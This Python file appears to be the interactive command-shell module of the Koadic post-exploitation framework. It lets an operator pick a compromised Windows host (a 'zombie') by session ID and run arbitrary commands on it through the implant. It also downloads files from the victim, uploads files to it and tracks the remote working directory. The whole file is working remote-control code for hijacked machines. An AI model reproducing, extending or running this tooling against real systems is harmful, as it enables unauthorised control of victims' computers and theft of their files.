DESCRIPTION = "command shell to interact with a zombie"

def autocomplete(shell, line, text, state):
    if len(line.split()) > 1:
        return None

    options = []

    for server in shell.stagers:
        for session in server.sessions:
            options.append(str(session.id))

    try:
        return options[state]
    except:
        return None

def help(shell):
    shell.print_plain("")
    shell.print_plain("Use %s to interact with a particular zombie." % (shell.colors.colorize("cmdshell ZOMBIE_ID", shell.colors.BOLD)))
    shell.print_plain("")

def get_prompt(shell, id, ip, cwd, isreadline = True):
        return "%s%s: %s%s" % (shell.colors.colorize("[", [shell.colors.NORMAL], isreadline),
                                 shell.colors.colorize("koadic", [shell.colors.BOLD], isreadline),
                                 shell.colors.colorize("ZOMBIE %s (%s)" % (id, ip), [shell.colors.CYAN], isreadline),
                                 shell.colors.colorize(" - %s]> " % (cwd), [shell.colors.NORMAL], isreadline))

def run_cmdshell(shell, session):
    import copy

    exec_cmd_name = 'implant/manage/exec_cmd'
    download_file_name = 'implant/util/download_file'
    upload_file_name= 'implant/util/upload_file'
    # this won't work, Error: "can't pickle module objects"
    #plugin = copy.deepcopy(shell.plugins['implant/manage/exec_cmd'])
    plugin = shell.plugins[exec_cmd_name]
    download_file_plugin = shell.plugins[download_file_name]
    upload_file_plugin = shell.plugins[upload_file_name]

    # copy (hacky shit)
    old_prompt = shell.prompt
    old_clean_prompt = shell.clean_prompt
    old_state = shell.state

    old_zombie = plugin.options.get("ZOMBIE")
    old_dir = plugin.options.get("DIRECTORY")
    old_out = plugin.options.get("OUTPUT")
    old_cmd = plugin.options.get("CMD")

    id = str(session.id)
    ip = session.ip

    emucwd = session.realcwd

    while True:
        shell.state = exec_cmd_name
        shell.prompt = get_prompt(shell, id, ip, emucwd, True)
        shell.clean_prompt = get_prompt(shell, id, ip, emucwd, False)
        plugin.options.set("ZOMBIE", id)
        plugin.options.set("DIRECTORY", "%TEMP%")
        plugin.options.set("OUTPUT", "true")

        try:
            import readline
            readline.set_completer(None)
            cmd = shell.get_command(shell.prompt)

            if len(cmd) > 0:
                if cmd.lower() in ['exit','quit']:
                    return
                elif cmd.split()[0].lower() == 'download' and len(cmd.split()) > 1:
                    old_download_zombie = download_file_plugin.options.get("ZOMBIE")
                    old_download_rfile = download_file_plugin.options.get("RFILE")
                    download_file_plugin.options.set("ZOMBIE", id)
                    rfile = emucwd
                    if rfile[-1] != "\\":
                        rfile += "\\"
                    rfile += " ".join(cmd.split(" ")[1:])
                    download_file_plugin.options.set("RFILE", rfile)
                    download_file_plugin.run()
                    download_file_plugin.options.set("ZOMBIE", old_download_zombie)
                    download_file_plugin.options.set("RFILE", old_download_rfile)
                    continue
                elif cmd.split()[0].lower() == 'upload' and len(cmd.split()) > 1:
                    old_upload_zombie = upload_file_plugin.options.get("ZOMBIE")
                    old_upload_lfile = upload_file_plugin.options.get("LFILE")
                    old_upload_dir = upload_file_plugin.options.get("DIRECTORY")
                    upload_file_plugin.options.set("ZOMBIE", id)
                    lfile = cmd.split()[1]
                    upload_file_plugin.options.set("LFILE", lfile)
                    upload_file_plugin.options.set("DIRECTORY", emucwd)
                    upload_file_plugin.run()
                    upload_file_plugin.options.set("ZOMBIE", old_upload_zombie)
                    upload_file_plugin.options.set("LFILE", old_upload_lfile)
                    upload_file_plugin.options.set("DIRECTORY", old_upload_dir)
                    continue
                elif cmd.split()[0].lower() == 'cd' and len(cmd.split()) > 1:
                    dest = " ".join(cmd.split(" ")[1:])
                    if ":" not in dest and ".." not in dest:
                        if emucwd[-1] != "\\":
                            emucwd += "\\"
                        emucwd += dest
                    elif ".." in dest:
                        for d in dest.split("\\"):
                            if ".." in d:
                                emucwd = "\\".join(emucwd.split("\\")[:-1])
                            else:
                                if emucwd[-1] != "\\":
                                    emucwd += "\\"
                                emucwd += d
                        if len(emucwd.split("\\")) == 1:
                            emucwd += "\\"

                    else:
                        emucwd = dest

                    if dest[0] == "%" and dest[-1] == "%":
                        plugin.options.set("CMD", "echo %s" % dest)
                        plugin.run()
                        j = plugin.ret_jobs[0]
                        for job in session.jobs:
                            if job.id == j:
                                while True:
                                    if job.results:
                                        varpath = job.results
                                        break
                        emucwd = varpath.split()[0]

                    cmd = "cd "+emucwd+ " & cd"
                else:
                    if emucwd:
                        cmd = "cd "+emucwd+" & "+cmd

                plugin.options.set("CMD", cmd)
                plugin.run()
        except KeyboardInterrupt:
            shell.print_plain(shell.clean_prompt)
            return
        except EOFError:
            shell.print_plain(shell.clean_prompt)
            return
        finally:
            plugin.options.set("ZOMBIE", old_zombie)
            plugin.options.set("CMD", old_cmd)
            plugin.options.set("DIRECTORY", old_dir)
            plugin.options.set("OUTPUT", old_out)

            shell.prompt = old_prompt
            shell.clean_prompt = old_clean_prompt
            shell.state = old_state


def execute(shell, cmd):
    splitted = cmd.split()
    if len(splitted) > 1:
        target = splitted[1]

        for server in shell.stagers:
            for session in server.sessions:
                if target == str(session.id):
                    run_cmdshell(shell, session)
                    return

        shell.print_error("Zombie #%s not found." % (target))
    else:
        shell.print_error("You must provide a zombie number as an argument.")
